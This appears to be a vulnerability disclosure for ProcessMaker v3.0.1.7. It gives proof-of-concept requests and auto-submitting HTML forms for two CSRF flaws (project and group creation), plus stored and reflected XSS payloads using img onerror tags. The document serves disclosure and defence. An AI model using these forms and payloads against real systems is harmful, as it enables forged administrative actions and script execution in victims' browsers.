Vulnerabilities description :
======================================================================
ProcessMaker v3.0.1.7 is vulnerable to multiple vulnerabilities like :
- Reflected XSS
- Stored XSS
- CSRF (x2)

PoC n°1 -  CSRF on Designer Project Creation
======================================================================
Designer Project creation process is vulnerable to CSRF vulnerability. a forged request can be used to force an authentified user with designer project creation rights to create a new Designer project.

PoC:

[REQUEST]
http://server/sysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject
[POSTDATA]
PRO_TITLE=AAA&PRO_DESCRIPTION=BBB&PRO_CATEGORY=

The following HTML form can be used to exploit this CSRF vulnerability when mixed to phishing technics or auto-submit javascript tricks :

<form method=POST name=form1 action="http://serversysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject">
        <input type=text name=PRO_TITLE value=XXX>
        <input type=text name=PRO_DESCRIPTION value=XXX>
        <input type=text name=PRO_CATEGORY value="">
        <input type=submit>
</form>
<script>
window.onload = function(){
  document.forms['form1'].submit()
}
</script>

Note that this CSRF vulnerability can be combined with the PoC n°3 that expose a stored XSS vulnerability in the Description input of Designer Project.

Proof of Concept n°2 - CSRF on group creation
======================================================================
Group creation process is vulnerable to CSRF vulnerability, a forged request can be used to force an authentified user with admin rights to create a new group.

PoC :
[REQUEST]
http://server/sysworkflow/en/neoclassic/groups/groups_Ajax?action=saveNewGroup
[POSTDATA]
name=swdcs&status=1

The following HTML form can be used to exploit this CSRF vulnerability when mixed to phishing technics or auto-submit javascript tricks :

<form method=POST name=form1 action="http://192.168.1.14/sysworkflow/en/neoclassic/groups/groups_Ajax?action=saveNewGroup">
  <input type=text name=name value=2>
  <input type=text name=status value=1>
  <input type=submit>
</form>
<script>
window.onload = function(){
  document.forms['form1'].submit()
}
</script>


Proof of Concept n°3  -  Stored XSS on Designer Project Creation
======================================================================
The "description" input of the designer project creation process is vulnerable to stored XSS. A user can use this input to store an XSS an make other user's browsers executes controlled JavaScript instructions.

PoC
[REQUEST]
http://server/sysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject
[POSTDATA]
PRO_TITLE=AA<img src=x onerror=alert(1)>A&PRO_DESCRIPTION=BBB&PRO_CATEGORY=

Note that this CSRF vulnerability can be combined with the PoC n°1 that expose a CSRF vulnerability in the Designer Project creation process.

Through this vulnerability, an attacker could tamper with page rendering or redirect victim to fake login page

Proof of Concept n°4 - Reflected Cross-Site Scripting (RXSS) with authentication :
======================================================================
The search form in the Design Project can redirect user to a blank page without HTML code. This page display some information including user request. We can use this situation to execute JavaScript instruction into browser's user.

Note that a search request use POST transmission method, to exploit this vulnerability, an attacker need to trap a user to visit a HTML form with auto-submit Javascript tricks to generate the forged request.

PoC :

[REQUEST]
http://server/sysworkflow/en/neoclassic/processes/processesList
[POSTDATA]
processName=<img src=x onerror=alert(1);>&start=0&limit=25&category=%3Creset%3E

Through this vulnerability, an attacker could tamper with page rendering or redirect victim to fake login page.
